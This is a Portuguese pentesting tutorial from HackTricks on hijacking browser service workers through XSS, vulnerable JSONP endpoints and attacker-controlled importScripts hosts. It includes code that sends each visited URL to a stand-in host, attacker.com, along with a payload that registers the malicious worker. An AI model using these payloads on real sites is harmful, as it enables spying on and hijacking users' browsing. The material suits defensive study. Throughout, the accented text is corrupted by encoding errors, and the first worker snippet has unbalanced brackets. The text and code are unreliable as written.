# Explorando os Service Workers



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que s√£o mais importantes para que voc√™ possa corrigi-las mais rapidamente. O Intruder rastreia sua superf√≠cie de ataque, executa varreduras proativas de amea√ßas, encontra problemas em toda a sua pilha tecnol√≥gica, de APIs a aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Informa√ß√µes B√°sicas

Um **service worker** √© um script executado pelo seu navegador em segundo plano, separado de qualquer p√°gina da web, permitindo recursos que n√£o requerem uma p√°gina da web ou intera√ß√£o do usu√°rio, melhorando assim as capacidades de **processamento offline e em segundo plano**. Informa√ß√µes detalhadas sobre service workers podem ser encontradas [aqui](https://developers.google.com/web/fundamentals/primers/service-workers). Ao explorar service workers em um dom√≠nio da web vulner√°vel, os atacantes podem obter controle sobre as intera√ß√µes da v√≠tima com todas as p√°ginas dentro desse dom√≠nio.


### Verificando a Exist√™ncia de Service Workers

Service workers existentes podem ser verificados na se√ß√£o **Service Workers** da guia **Application** nas **Ferramentas do Desenvolvedor**. Outro m√©todo √© visitar [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) para uma visualiza√ß√£o mais detalhada.

### Notifica√ß√µes Push

As **permiss√µes de notifica√ß√£o push** impactam diretamente a capacidade de um **service worker** se comunicar com o servidor sem intera√ß√£o direta do usu√°rio. Se as permiss√µes forem negadas, isso limita o potencial do service worker de representar uma amea√ßa cont√≠nua. Por outro lado, conceder permiss√µes aumenta os riscos de seguran√ßa ao permitir a recep√ß√£o e execu√ß√£o de poss√≠veis exploits.

## Ataque Criando um Service Worker

Para explorar essa vulnerabilidade, voc√™ precisa encontrar:

* Uma maneira de **carregar arquivos JS arbitr√°rios** no servidor e um **XSS para carregar o service worker** do arquivo JS carregado
* Uma **solicita√ß√£o JSONP vulner√°vel** onde voc√™ pode **manipular a sa√≠da (com c√≥digo JS arbitr√°rio)** e um **XSS** para **carregar o JSONP com um payload** que ir√° **carregar um service worker malicioso**.

No exemplo a seguir, vou apresentar um c√≥digo para **registrar um novo service worker** que ir√° ouvir o evento `fetch` e **enviar para o servidor dos atacantes cada URL acessada** (este √© o c√≥digo que voc√™ precisaria **carregar** no **servidor** ou carregar via uma resposta **JSONP vulner√°vel**):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
E este √© o c√≥digo que ir√° **registrar o worker** (o c√≥digo que voc√™ deveria ser capaz de executar abusando de um **XSS**). Neste caso, uma requisi√ß√£o **GET** ser√° enviada para o servidor dos **atacantes** **notificando** se o **registro** do service worker foi bem-sucedido ou n√£o:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
No caso de abusar de um ponto final JSONP vulner√°vel, voc√™ deve colocar o valor dentro de `var sw`. Por exemplo:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
Existe um **C2** dedicado √† **explora√ß√£o de Service Workers** chamado [**Shadow Workers**](https://shadow-workers.github.io) que ser√° muito √∫til para abusar dessas vulnerabilidades.

A diretiva de **cache de 24 horas** limita a vida de um **service worker (SW)** malicioso ou comprometido a no m√°ximo 24 horas ap√≥s a corre√ß√£o de uma vulnerabilidade de XSS, assumindo status de cliente online. Para minimizar a vulnerabilidade, os operadores do site podem reduzir o Tempo de Vida (TTL) do script do SW. Os desenvolvedores tamb√©m s√£o aconselhados a criar um [**interruptor de desativa√ß√£o do service worker**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) para desativa√ß√£o r√°pida.

## Abusando do `importScripts` em um SW via DOM Clobbering

A fun√ß√£o **`importScripts`** chamada de um Service Worker pode **importar um script de um dom√≠nio diferente**. Se esta fun√ß√£o for chamada usando um **par√¢metro que um atacante poderia** modificar, ele seria capaz de **importar um script JS de seu dom√≠nio** e obter XSS.

**Isso at√© mesmo burla as prote√ß√µes CSP.**

**Exemplo de c√≥digo vulner√°vel:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### Com DOM Clobbering

Para mais informa√ß√µes sobre o que √© o DOM Clobbering, consulte:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Se a URL/dom√≠nio que o SW est√° usando para chamar **`importScripts`** estiver **dentro de um elemento HTML**, √© **poss√≠vel modific√°-lo via DOM Clobbering** para fazer o SW **carregar um script do seu pr√≥prio dom√≠nio**.

Para um exemplo disso, consulte o link de refer√™ncia.

## Refer√™ncias

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encontre vulnerabilidades que mais importam para que voc√™ possa corrigi-las mais rapidamente. O Intruder rastreia sua superf√≠cie de ataque, executa varreduras proativas de amea√ßas, encontra problemas em toda a sua pilha tecnol√≥gica, de APIs a aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
